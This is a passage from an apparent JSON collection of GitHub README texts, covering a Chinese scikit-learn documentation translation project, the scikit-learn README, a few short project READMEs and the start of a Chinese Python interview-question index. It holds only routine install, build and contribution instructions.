density.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| RobinSeaside |\n| dp-derivation.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg) | leavesandflowers |\n| ensemble.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|ustblzj|\n| feature_extraction.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)| minoriwww |\n| feature_selection.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| taoyizhi68 |\n| gaussian_process.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|alingse|\n| grid_search.rst | ![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg) | LianYun |\n| isotonic.rst | ![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg) | LinXueyuanStdio|\n| kernel_approximation.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-undo-lightgray.svg)|heyuanhao|\n| kernel_ridge.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|[nevertiree](https:\/\/github.com\/nevertiree)|\n| label_propagation.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| lihao1992 |\n| lda_qda.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|ShangruZhong|\n| learning_curve.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| taoyizhi68 |\n| manifold.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|[nevertiree](https:\/\/github.com\/nevertiree)|\n| metrics.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|[frankchen0130](https:\/\/frankchen0130.github.io\/)|\n| mixture.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|haisheng-zhang|\n| model_evaluation.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|ShangruZhong|\n| model_persistence.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| multiclass.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| naive_bayes.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)| minoriwww |\n| neighbors.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|zhongyu211|\n| neural_networks_supervised.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|RobinSeaside|\n| neural_networks_unsupervised.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|RobinSeaside|\n| outlier_detection.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| pipeline.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|bwanglzu|\n| preprocessing.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|Perfe|\n| preprocessing_targets.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|Perfe|\n| random_projection.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| scaling_strategies.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| sgd.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-done-blue.svg)|lzjqsdd|\n| tree.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|RobinSeaside|\n| unsupervised_reduction.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|iphyer|\n| svm.rst |![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|lzjqsdd|\n| decomposition.rst|![Build Status](https:\/\/img.shields.io\/badge\/translate-doing-brightgreen.svg)|[Stephen.Z](https:\/\/github.com\/StephenZMZ\/)|\n\n\u9996\u5148fork\u8be5\u9879\u76ee\u5230\u4e2a\u4ebagithub\uff0cclone\u5230\u672c\u5730\uff0c\u4fee\u6539README\u4e2d\u8981\u7533\u9886\u7684\u7ffb\u8bd1\u5185\u5bb9\u7684\u72b6\u6001\uff0c\u63d0\u4ea4pull request,\u63a5\u53d7\u4e4b\u540e\u5373\u53ef\u5f00\u59cb\u7ffb\u8bd1\u5de5\u4f5c\u3002\n\u7ffb\u8bd1\u7ed3\u675f\u540e\u786e\u4fdd\u53ef\u6b63\u5e38\u7f16\u8bd1\u6210html\uff0c\u7136\u540e\u53ea\u63d0\u4ea4rst\u6587\u4ef6\u7684\u4fee\u6539\uff0c\u4e0d\u8981\u6dfb\u52a0sphinx\u751f\u6210\u7684\u6587\u4ef6\u3002\n**\u6240\u6709\u7ffb\u8bd1\u540e\u7684\u6587\u6863\u4ee5\u540c\u540d\u7684\u65b9\u5f0f\u6dfb\u52a0\u5230translate\/\u540c\u76ee\u5f55\u6587\u4ef6\u5939\u4e0b,\u4f8b\u5982\uff1a**  \n\n    svm.rst\u7684\u7ffb\u8bd1\u6587\u6863 \u63d0\u4ea4\u5230\u9879\u76eetranslate\/modules\/svm.rst\u4e0b,\u7ffb\u8bd1\u5b8c\u6210\u4e4b\u540e\u8986\u76d6doc\/modules\/svm.rst\u3002\n\n*\u5efa\u8bae\u7ffb\u8bd1\u65f6\u53c2\u8003[wiki](https:\/\/github.com\/lzjqsdd\/scikit-learn-doc-cn\/wiki\/%E5%B8%B8%E8%A7%81%E7%BF%BB%E8%AF%91%E5%AF%B9%E5%BA%94%E8%A1%A8)\u4e2d\u7684\u672f\u8bed\u5bf9\u7167\u8868*\n*\u63a8\u8350\u6587\u672c\u7f16\u8f91\u5668:vscode+Preview\u63d2\u4ef6 \u6216 vim \uff0c\u53ef\u4ee5\u5bf9rst\u6587\u4ef6\u8bed\u6cd5\u9ad8\u4eae\uff0c\u907f\u514d\u7ffb\u8bd1\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u8bed\u6cd5\u9519\u8bef*\n\n\n## \u9636\u6bb5\u4e8c\n\u5b98\u65b9\u6846\u67b6\u7ffb\u8bd1\n\n# \u914d\u7f6e\u53ca\u7f16\u8bd1\n\n### \u81ea\u52a8\u90e8\u7f72\n\n    \u672c\u9879\u76ee\u91c7\u7528travis-ci\u6301\u7eed\u96c6\u6210\u6765\u5b9e\u73b0\u81ea\u52a8\u7f16\u8bd1\u90e8\u7f72\uff0c\u7ffb\u8bd1\u7684\u6587\u6863\u63d0\u4ea4pull request\u5230master\uff0c\u5408\u5e76\u540e\u4f1a\u81ea\u52a8\u628ahtml\u90e8\u7f72\u5230gh-pages\u5206\u652f\u4e0a\uff0c\u7f51\u7ad9\u6258\u7ba1\u5728sklearn.lzjqsdd.com\n\n### \u672c\u5730\u7f16\u8bd1\n\u5b89\u88c5\u5fc5\u8981\u7684\u73af\u5883:\n\n\tsudo pip install numpy\n    sudo pip install scipy\n    sudo pip install sphinx\n    #\u4e0a\u8ff0\u4e3a\u4f9d\u8d56\u7684\u5305\n    sudo pip install -U scikit-learn\n\n\u751f\u6210html\uff08\u548c\u5b98\u7f51web\u9875\u4e00\u6837\uff09\n\n    make html\n\n\u751f\u6210\u6587\u4ef6\u4f1a\u5728\u5728_build\/html\u76ee\u5f55\u4e0b:\n\n\u5982\u679c\u8981\u751f\u6210PDF\u624b\u518c\u7684\u8bdd\uff1a\n\n    make latexpdf\n\n\u90e8\u7f72gh-pages\uff1a\n\n\t\u7531\u4e8eSphinx\u751f\u6210\u7684html\u6709\u81ea\u5df1\u7684\u9759\u6001\u8d44\u6e90\uff0c\u9700\u8981\u5728gh-pages\u5206\u652f\u52a0\u5165.nojekyll\u6587\u4ef6\u3002\n\n\u914d\u7f6e\u4e2d\u5176\u4ed6\u7684\u95ee\u9898\uff1a\n\t[Issue](https:\/\/github.com\/lzjqsdd\/scikit-learn-doc-cn\/blob\/master\/issue.md)\n"},{"repo":"\/scikit-learn\/scikit-learn","language":"Python","readme_contents":".. -*- mode: rst -*-\n\n|Azure|_ |Travis|_ |Codecov|_ |CircleCI|_ |PythonVersion|_ |PyPi|_ |DOI|_\n\n.. |Azure| image:: https:\/\/dev.azure.com\/scikit-learn\/scikit-learn\/_apis\/build\/status\/scikit-learn.scikit-learn?branchName=master\n.. _Azure: https:\/\/dev.azure.com\/scikit-learn\/scikit-learn\/_build\/latest?definitionId=1&branchName=master\n\n.. |Travis| image:: https:\/\/api.travis-ci.org\/scikit-learn\/scikit-learn.svg?branch=master\n.. _Travis: https:\/\/travis-ci.org\/scikit-learn\/scikit-learn\n\n.. |Codecov| image:: https:\/\/codecov.io\/github\/scikit-learn\/scikit-learn\/badge.svg?branch=master&service=github\n.. _Codecov: https:\/\/codecov.io\/github\/scikit-learn\/scikit-learn?branch=master\n\n.. |CircleCI| image:: https:\/\/circleci.com\/gh\/scikit-learn\/scikit-learn\/tree\/master.svg?style=shield&circle-token=:circle-token\n.. _CircleCI: https:\/\/circleci.com\/gh\/scikit-learn\/scikit-learn\n\n.. |PythonVersion| image:: https:\/\/img.shields.io\/pypi\/pyversions\/scikit-learn.svg\n.. _PythonVersion: https:\/\/img.shields.io\/pypi\/pyversions\/scikit-learn.svg\n\n.. |PyPi| image:: https:\/\/badge.fury.io\/py\/scikit-learn.svg\n.. _PyPi: https:\/\/badge.fury.io\/py\/scikit-learn\n\n.. |DOI| image:: https:\/\/zenodo.org\/badge\/21369\/scikit-learn\/scikit-learn.svg\n.. _DOI: https:\/\/zenodo.org\/badge\/latestdoi\/21369\/scikit-learn\/scikit-learn\n\nscikit-learn\n============\n\nscikit-learn is a Python module for machine learning built on top of\nSciPy and is distributed under the 3-Clause BSD license.\n\nThe project was started in 2007 by David Cournapeau as a Google Summer\nof Code project, and since then many volunteers have contributed. See\nthe `About us <http:\/\/scikit-learn.org\/dev\/about.html#authors>`__ page\nfor a list of core contributors.\n\nIt is currently maintained by a team of volunteers.\n\nWebsite: http:\/\/scikit-learn.org\n\n\nInstallation\n------------\n\nDependencies\n~~~~~~~~~~~~\n\nscikit-learn requires:\n\n- Python (>= 3.5)\n- NumPy (>= 1.11.0)\n- SciPy (>= 0.17.0)\n- joblib (>= 0.11)\n\n**Scikit-learn 0.20 was the last version to support Python 2.7 and Python 3.4.**\nscikit-learn 0.21 and later require Python 3.5 or newer.\n\nScikit-learn plotting capabilities (i.e., functions start with ``plot_``\nand classes end with \"Display\") require Matplotlib (>= 1.5.1). For running the\nexamples Matplotlib >= 1.5.1 is required. A few examples require\nscikit-image >= 0.12.3, a few examples require pandas >= 0.18.0.\n\nUser installation\n~~~~~~~~~~~~~~~~~\n\nIf you already have a working installation of numpy and scipy,\nthe easiest way to install scikit-learn is using ``pip``   ::\n\n    pip install -U scikit-learn\n\nor ``conda``::\n\n    conda install scikit-learn\n\nThe documentation includes more detailed `installation instructions <http:\/\/scikit-learn.org\/stable\/install.html>`_.\n\n\nChangelog\n---------\n\nSee the `changelog <http:\/\/scikit-learn.org\/dev\/whats_new.html>`__\nfor a history of notable changes to scikit-learn.\n\nDevelopment\n-----------\n\nWe welcome new contributors of all experience levels. The scikit-learn\ncommunity goals are to be helpful, welcoming, and effective. The\n`Development Guide <http:\/\/scikit-learn.org\/stable\/developers\/index.html>`_\nhas detailed information about contributing code, documentation, tests, and\nmore. We've included some basic information in this README.\n\nImportant links\n~~~~~~~~~~~~~~~\n\n- Official source code repo: https:\/\/github.com\/scikit-learn\/scikit-learn\n- Download releases: https:\/\/pypi.org\/project\/scikit-learn\/\n- Issue tracker: https:\/\/github.com\/scikit-learn\/scikit-learn\/issues\n\nSource code\n~~~~~~~~~~~\n\nYou can check the latest sources with the command::\n\n    git clone https:\/\/github.com\/scikit-learn\/scikit-learn.git\n\nContributing\n~~~~~~~~~~~~\n\nTo learn more about making a contribution to scikit-learn, please see our\n`Contributing guide\n<https:\/\/scikit-learn.org\/dev\/developers\/contributing.html>`_.\n\nTesting\n~~~~~~~\n\nAfter installation, you can launch the test suite from outside the\nsource directory (you will need to have ``pytest`` >= 3.3.0 installed)::\n\n    pytest sklearn\n\nSee the web page http:\/\/scikit-learn.org\/dev\/developers\/advanced_installation.html#testing\nfor more information.\n\n    Random number generation can be controlled during testing by setting\n    the ``SKLEARN_SEED`` environment variable.\n\nSubmitting a Pull Request\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBefore opening a Pull Request, have a look at the\nfull Contributing page to make sure your code complies\nwith our guidelines: http:\/\/scikit-learn.org\/stable\/developers\/index.html\n\n\nProject History\n---------------\n\nThe project was started in 2007 by David Cournapeau as a Google Summer\nof Code project, and since then many volunteers have contributed. See\nthe `About us <http:\/\/scikit-learn.org\/dev\/about.html#authors>`__ page\nfor a list of core contributors.\n\nThe project is currently maintained by a team of volunteers.\n\n**Note**: `scikit-learn` was previously referred to as `scikits.learn`.\n\n\nHelp and Support\n----------------\n\nDocumentation\n~~~~~~~~~~~~~\n\n- HTML documentation (stable release): http:\/\/scikit-learn.org\n- HTML documentation (development version): http:\/\/scikit-learn.org\/dev\/\n- FAQ: http:\/\/scikit-learn.org\/stable\/faq.html\n\nCommunication\n~~~~~~~~~~~~~\n\n- Mailing list: https:\/\/mail.python.org\/mailman\/listinfo\/scikit-learn\n- IRC channel: ``#scikit-learn`` at ``webchat.freenode.net``\n- Stack Overflow: https:\/\/stackoverflow.com\/questions\/tagged\/scikit-learn\n- Website: http:\/\/scikit-learn.org\n\nCitation\n~~~~~~~~\n\nIf you use scikit-learn in a scientific publication, we would appreciate citations: http:\/\/scikit-learn.org\/stable\/about.html#citing-scikit-learn\n"},{"repo":"\/rauchg\/chat-example","language":"HTML","readme_contents":"Now maintained here: https:\/\/github.com\/socketio\/chat-example\n"},{"repo":"\/adobe-fonts\/source-code-pro","language":"CSS","readme_contents":"# Source Code Pro\n\n[Source Code Pro](http:\/\/adobe-fonts.github.io\/source-code-pro\/)\nis a set of OpenType fonts that have been designed to work well\nin user interface (UI) environments.\n\n## Open source files\n\nThe fonts' source files and build instructions are available in the [repository's `master` branch](https:\/\/github.com\/adobe-fonts\/source-code-pro\/tree\/master).\n\n## Getting involved\n\n[Open an issue](https:\/\/github.com\/adobe-fonts\/source-code-pro\/issues) or send a suggestion to Source Code's designer [Paul D. Hunt](mailto:opensourcefonts@adobe.com?subject=[GitHub]%20Source%20Code%20Pro), for consideration.\n\n## Releases\n\n* [Latest release](..\/..\/releases\/latest)\n* [All releases](..\/..\/releases)\n"},{"repo":"\/WICG\/change-password-url","language":"HTML","readme_contents":"# A Well-Known URL for Changing Passwords\n\nThis [specification](https:\/\/wicg.github.io\/change-password-url\/index.html) defines the <code>\/.well-known\/change-password<\/code>\n[well-known resource](https:\/\/tools.ietf.org\/html\/rfc5785).\n\nFor more context, please read the [explainer](explainer.md).\n\nAll [participation](CONTRIBUTING.md) is governed by the\n[W3C Community Group Participation Policies](https:\/\/www.w3.org\/community\/about\/agreements\/#policies), the\n[Web Platform Incubator Community Group Charter](https:\/\/wicg.github.io\/admin\/charter.html), and the\n[W3C Code of Ethics and Professional Conduct](https:\/\/www.w3.org\/Consortium\/cepc\/).\n"},{"repo":"\/kenwoodjw\/python_interview_question","language":null,"readme_contents":"<!-- TOC -->\n\n- [Python\u57fa\u7840](#python\u57fa\u7840)\n    - [\u6587\u4ef6\u64cd\u4f5c](#\u6587\u4ef6\u64cd\u4f5c)\n        - [1.\u6709\u4e00\u4e2ajsonline\u683c\u5f0f\u7684\u6587\u4ef6file.txt\u5927\u5c0f\u7ea6\u4e3a10K](#1\u6709\u4e00\u4e2ajsonline\u683c\u5f0f\u7684\u6587\u4ef6filetxt\u5927\u5c0f\u7ea6\u4e3a10k)\n        - [2.\u8865\u5145\u7f3a\u5931\u7684\u4ee3\u7801](#2\u8865\u5145\u7f3a\u5931\u7684\u4ee3\u7801)\n    - [\u6a21\u5757\u4e0e\u5305](#\u6a21\u5757\u4e0e\u5305)\n        - [3.\u8f93\u5165\u65e5\u671f\uff0c \u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929\uff1f](#3\u8f93\u5165\u65e5\u671f-\u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929)\n        - [4.\u6253\u4e71\u4e00\u4e2a\u6392\u597d\u5e8f\u7684list\u5bf9\u8c61alist\uff1f](#4\u6253\u4e71\u4e00\u4e2a\u6392\u597d\u5e8f\u7684list\u5bf9\u8c61alist)\n    - [\u6570\u636e\u7c7b\u578b](#\u6570\u636e\u7c7b\u578b)\n        - [5.\u73b0\u6709\u5b57\u5178 d= {'a':24,'g':52,'i':12,'k':33}\u8bf7\u6309value\u503c\u8fdb\u884c\u6392\u5e8f?](#5\u73b0\u6709\u5b57\u5178-d-a24g52i12k33\u8bf7\u6309value\u503c\u8fdb\u884c\u6392\u5e8f)\n        - [6.\u5b57\u5178\u63a8\u5bfc\u5f0f](#6\u5b57\u5178\u63a8\u5bfc\u5f0f)\n        - [7.\u8bf7\u53cd\u8f6c\u5b57\u7b26\u4e32 \"aStr\"?](#7\u8bf7\u53cd\u8f6c\u5b57\u7b26\u4e32-astr)\n        - [8.\u5c06\u5b57\u7b26\u4e32 \"k:1 |k1:2|k2:3|k3:4\"\uff0c\u5904\u7406\u6210\u5b57\u5178 {k:1,k1:2,...}](#8\u5c06\u5b57\u7b26\u4e32-k1-k12k23k34\u5904\u7406\u6210\u5b57\u5178-k1k12)\n        - [9.\u8bf7\u6309alist\u4e2d\u5143\u7d20\u7684age\u7531\u5927\u5230\u5c0f\u6392\u5e8f](#9\u8bf7\u6309alist\u4e2d\u5143\u7d20\u7684age\u7531\u5927\u5230\u5c0f\u6392\u5e8f)\n        - [10.\u4e0b\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48\uff1f](#10\u4e0b\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48)\n        - [11.\u5199\u4e00\u4e2a\u5217\u8868\u751f\u6210\u5f0f\uff0c\u4ea7\u751f\u4e00\u4e2a\u516c\u5dee\u4e3a11\u7684\u7b49\u5dee\u6570\u5217](#11\u5199\u4e00\u4e2a\u5217\u8868\u751f\u6210\u5f0f\u4ea7\u751f\u4e00\u4e2a\u516c\u5dee\u4e3a11\u7684\u7b49\u5dee\u6570\u5217)\n        - [12.\u7ed9\u5b9a\u4e24\u4e2a\u5217\u8868\uff0c\u600e\u4e48\u627e\u51fa\u4ed6\u4eec\u76f8\u540c\u7684\u5143\u7d20\u548c\u4e0d\u540c\u7684\u5143\u7d20\uff1f](#12\u7ed9\u5b9a\u4e24\u4e2a\u5217\u8868\u600e\u4e48\u627e\u51fa\u4ed6\u4eec\u76f8\u540c\u7684\u5143\u7d20\u548c\u4e0d\u540c\u7684\u5143\u7d20)\n        - [13.\u8bf7\u5199\u51fa\u4e00\u6bb5python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664list\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20\uff1f](#13\u8bf7\u5199\u51fa\u4e00\u6bb5python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664list\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20)\n        - [14.\u7ed9\u5b9a\u4e24\u4e2alist A\uff0cB ,\u8bf7\u7528\u627e\u51faA\uff0cB\u4e2d\u76f8\u540c\u4e0e\u4e0d\u540c\u7684\u5143\u7d20](#14\u7ed9\u5b9a\u4e24\u4e2alist-ab-\u8bf7\u7528\u627e\u51faab\u4e2d\u76f8\u540c\u4e0e\u4e0d\u540c\u7684\u5143\u7d20)\n    - [\u4f01\u4e1a\u9762\u8bd5\u9898](#\u4f01\u4e1a\u9762\u8bd5\u9898)\n        - [15.python\u65b0\u5f0f\u7c7b\u548c\u7ecf\u5178\u7c7b\u7684\u533a\u522b\uff1f](#15python\u65b0\u5f0f\u7c7b\u548c\u7ecf\u5178\u7c7b\u7684\u533a\u522b)\n        - [16.python\u4e2d\u5185\u7f6e\u7684\u6570\u636e\u7ed3\u6784\u6709\u51e0\u79cd\uff1f](#16python\u4e2d\u5185\u7f6e\u7684\u6570\u636e\u7ed3\u6784\u6709\u51e0\u79cd)\n        - [17.python\u5982\u4f55\u5b9e\u73b0\u5355\u4f8b\u6a21\u5f0f?\u8bf7\u5199\u51fa\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f?](#17python\u5982\u4f55\u5b9e\u73b0\u5355\u4f8b\u6a21\u5f0f\u8bf7\u5199\u51fa\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f)\n        - [18.\u53cd\u8f6c\u4e00\u4e2a\u6574\u6570\uff0c\u4f8b\u5982-123 --> -321](#18\u53cd\u8f6c\u4e00\u4e2a\u6574\u6570\u4f8b\u5982-123-----321)\n        - [19.\u8bbe\u8ba1\u5b9e\u73b0\u904d\u5386\u76ee\u5f55\u4e0e\u5b50\u76ee\u5f55\uff0c\u6293\u53d6.pyc\u6587\u4ef6](#19\u8bbe\u8ba1\u5b9e\u73b0\u904d\u5386\u76ee\u5f55\u4e0e\u5b50\u76ee\u5f55\u6293\u53d6pyc\u6587\u4ef6)\n        - [20.\u4e00\u884c\u4ee3\u7801\u5b9e\u73b01-100\u4e4b\u548c](#20\u4e00\u884c\u4ee3\u7801\u5b9e\u73b01-100\u4e4b\u548c)\n        - [21.Python-\u904d\u5386\u5217\u8868\u65f6\u5220\u9664\u5143\u7d20\u7684\u6b63\u786e\u505a\u6cd5](#21python-\u904d\u5386\u5217\u8868\u65f6\u5220\u9664\u5143\u7d20\u7684\u6b63\u786e\u505a\u6cd5)\n        - [22.\u5b57\u7b26\u4e32\u7684\u64cd\u4f5c\u9898\u76ee](#22\u5b57\u7b26\u4e32\u7684\u64cd\u4f5c\u9898\u76ee)\n        - [23.\u53ef\u53d8\u7c7b\u578b\u548c\u4e0d\u53ef\u53d8\u7c7b\u578b](#23\u53ef\u53d8\u7c7b\u578b\u548c\u4e0d\u53ef\u53d8\u7c7b\u578b)\n        - [24.is\u548c==\u6709\u4ec0\u4e48\u533a\u522b\uff1f](#24is\u548c\u6709\u4ec0\u4e48\u533a\u522b)\n        - [25.\u6c42\u51fa\u5217\u8868\u6240\u6709\u5947\u6570\u5e76\u6784\u9020\u65b0\u5217\u8868](#25\u6c42\u51fa\u5217\u8868\u6240\u6709\u5947\u6570\u5e76\u6784\u9020\u65b0\u5217\u8868)\n        - [26.\u7528\u4e00\u884cpython\u4ee3\u7801\u5199\u51fa1+2+3+10248](#26\u7528\u4e00\u884cpython\u4ee3\u7801\u5199\u51fa12310248)\n        - [27.Python\u4e2d\u53d8\u91cf\u7684\u4f5c\u7528\u57df\uff1f\uff08\u53d8\u91cf\u67e5\u627e\u987a\u5e8f)](#27python\u4e2d\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u53d8\u91cf\u67e5\u627e\u987a\u5e8f)\n        - [28.\u5b57\u7b26\u4e32 `\"123\"` \u8f6c\u6362\u6210 `123`\uff0c\u4e0d\u4f7f\u7528\u5185\u7f6eapi\uff0c\u4f8b\u5982 `int()`](#28\u5b57\u7b26\u4e32-123-\u8f6c\u6362\u6210-123\u4e0d\u4f7f\u7528\u5185\u7f6eapi\u4f8b\u5982-int)\n        - [29.Given an array of integers](#29given-an-array-of-integers)\n        - [30.python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664\u4e00\u4e2alist\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20](#30python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664\u4e00\u4e2alist\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20)\n        - [31.\u7edf\u8ba1\u4e00\u4e2a\u6587\u672c\u4e2d\u5355\u8bcd\u9891\u6b21\u6700\u9ad8\u768410\u4e2a\u5355\u8bcd\uff1f](#31\u7edf\u8ba1\u4e00\u4e2a\u6587\u672c\u4e2d\u5355\u8bcd\u9891\u6b21\u6700\u9ad8\u768410\u4e2a\u5355\u8bcd)\n        - [32.\u8bf7\u5199\u51fa\u4e00\u4e2a\u51fd\u6570\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6](#32\u8bf7\u5199\u51fa\u4e00\u4e2a\u51fd\u6570\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6)\n        - [33.\u4f7f\u7528\u5355\u4e00\u7684\u5217\u8868\u751f\u6210\u5f0f\u6765\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u5217\u8868](#33\u4f7f\u7528\u5355\u4e00\u7684\u5217\u8868\u751f\u6210\u5f0f\u6765\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u5217\u8868)\n        - [34.\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210[1,4,9,16,25,36,49,64,81,100]](#34\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210149162536496481100)\n        - [35.\u8f93\u5165\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\uff0c\u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929\uff1f](#35\u8f93\u5165\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929)\n        - [36.\u4e24\u4e2a\u6709\u5e8f\u5217\u8868\uff0cl1,l2\uff0c\u5bf9\u8fd9\u4e24\u4e2a\u5217\u8868\u8fdb\u884c\u5408\u5e76\u4e0d\u53ef\u4f7f\u7528extend](#36\u4e24\u4e2a\u6709\u5e8f\u5217\u8868l1l2\u5bf9\u8fd9\u4e24\u4e2a\u5217\u8868\u8fdb\u884c\u5408\u5e76\u4e0d\u53ef\u4f7f\u7528extend)\n        - [37.\u7ed9\u5b9a\u4e00\u4e2a\u4efb\u610f\u957f\u5ea6\u6570\u7ec4\uff0c\u5b9e\u73b0\u4e00\u4e2a\u51fd\u6570](#37\u7ed9\u5b9a\u4e00\u4e2a\u4efb\u610f\u957f\u5ea6\u6570\u7ec4\u5b9e\u73b0\u4e00\u4e2a\u51fd\u6570)\n        - [38.\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\uff0c\u7b2c\u4e8c\u5927\u7684\u6570](#38\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\u7b2c\u4e8c\u5927\u7684\u6570)\n        - [39.\u9605\u8bfb\u4e00\u4e0b\u4ee3\u7801\u4ed6\u4eec\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4ec0\u4e48\uff1f](#39\u9605\u8bfb\u4e00\u4e0b\u4ee3\u7801\u4ed6\u4eec\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4ec0\u4e48)\n        - [40.\u7edf\u8ba1\u4e00\u6bb5\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u51fa\u73b0\u7684\u6b21\u6570](#40\u7edf\u8ba1\u4e00\u6bb5\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u51fa\u73b0\u7684\u6b21\u6570)\n        - [41.super\u51fd\u6570\u7684\u5177\u4f53\u7528\u6cd5\u548c\u573a\u666f](#41super\u51fd\u6570\u7684\u5177\u4f53\u7528\u6cd5\u548c\u573a\u666f)\n- [Python\u9ad8\u7ea7](#python\u9ad8\u7ea7)\n    - [\u5143\u7c7b](#\u5143\u7c7b)\n        - [42.Python\u4e2d\u7c7b\u65b9\u6cd5\u3001\u7c7b\u5b9e\u4f8b\u65b9\u6cd5\u3001\u9759\u6001\u65b9\u6cd5\u6709\u4f55\u533a\u522b\uff1f](#42python\u4e2d\u7c7b\u65b9\u6cd5\u7c7b\u5b9e\u4f8b\u65b9\u6cd5\u9759\u6001\u65b9\u6cd5\u6709\u4f55\u533a\u522b)\n        - [43.\u904d\u5386\u4e00\u4e2aobject\u7684\u6240\u6709\u5c5e\u6027\uff0c\u5e76print\u6bcf\u4e00\u4e2a\u5c5e\u6027\u540d\uff1f](#43\u904d\u5386\u4e00\u4e2aobject\u7684\u6240\u6709\u5c5e\u6027\u5e76print\u6bcf\u4e00\u4e2a\u5c5e\u6027\u540d)\n        - [44.\u5199\u4e00\u4e2a\u7c7b\uff0c\u5e76\u8ba9\u5b83\u5c3d\u53ef\u80fd\u591a\u7684\u652f\u6301\u64cd\u4f5c\u7b26?](#44\u5199\u4e00\u4e2a\u7c7b\u5e76\u8ba9\u5b83\u5c3d\u53ef\u80fd\u591a\u7684\u652f\u6301\u64cd\u4f5c\u7b26)\n        - [45.\u4ecb\u7ecdCython\uff0cPypy Cpython Numba\u5404\u6709\u4ec0\u4e48\u7f3a\u70b9](#45\u4ecb\u7ecdcythonpypy-cpython-numba\u5404\u6709\u4ec0\u4e48\u7f3a\u70b9)\n        - [46.\u8bf7\u63cf\u8ff0\u62bd\u8c61\u7c7b\u548c\u63a5\u53e3\u7c7b\u7684\u533a\u522b\u548c\u8054\u7cfb](#46\u8bf7\u63cf\u8ff0\u62bd\u8c61\u7c7b\u548c\u63a5\u53e3\u7c7b\u7684\u533a\u522b\u548c\u8054\u7cfb)\n        - 